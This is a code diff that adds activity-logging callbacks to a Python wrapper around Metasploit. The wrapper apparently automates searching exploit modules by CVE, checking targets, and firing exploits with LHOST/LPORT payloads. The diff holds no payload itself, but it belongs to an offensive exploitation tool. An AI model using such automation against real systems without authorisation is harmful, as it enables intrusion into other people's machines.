@@ -81,12 +81,21 @@ class MsfConfig:
 
 
 class MsfClient:
-    def __init__(self, cfg: MsfConfig):
+    def __init__(self, cfg: MsfConfig, on_activity=None):
         self.cfg = cfg
+        self._on_activity = on_activity
         self._client = None
         self._lport_pool: queue.Queue = queue.Queue()
         for p in range(cfg.lport_base, cfg.lport_base + cfg.lport_count):
             self._lport_pool.put(p)
+
+    def _activity(self, source, text):
+        if not self._on_activity:
+            return
+        try:
+            self._on_activity(source, text)
+        except Exception:
+            pass
 
     # -- connection --
 
@@ -163,6 +172,9 @@ class MsfClient:
     def candidates_for_service(self, service):
         """Search every CVE on the service, filter to fireable exploit modules,
         dedup, rank-sort, and cap. Returns a list of Candidate (unchecked)."""
+        label = service.product or service.name or "service"
+        self._activity("msf", f"search exploits {label} :{service.port} "
+                              f"({len(service.cves)} cve)")
         by_module = {}
         for cve in service.cves:
             for entry in self._search_cve(cve.cve_id):
@@ -187,6 +199,7 @@ class MsfClient:
     def check(self, candidate, rhost, port):
         """Run the module check on a fresh isolated console. Returns
         (Verdict, detail_text)."""
+        self._activity("msf", f"check {candidate.module} @ {rhost}:{port}")
         cid = None
         try:
             console = self._client.consoles.console()
@@ -264,6 +277,9 @@ class MsfClient:
                 return None
             _set_if_present(payload, "LHOST", lhost)
             _set_if_present(payload, "LPORT", int(lport))
+            self._activity("fire", f"execute {candidate.module} "
+                                   f"payload={payload_name} LHOST={lhost} "
+                                   f"LPORT={lport} @ {rhost}")
             result = exploit.execute(payload=payload)
             if not isinstance(result, dict) or not result.get("uuid"):
                 logger.warning("execute returned no uuid for %s: %s",
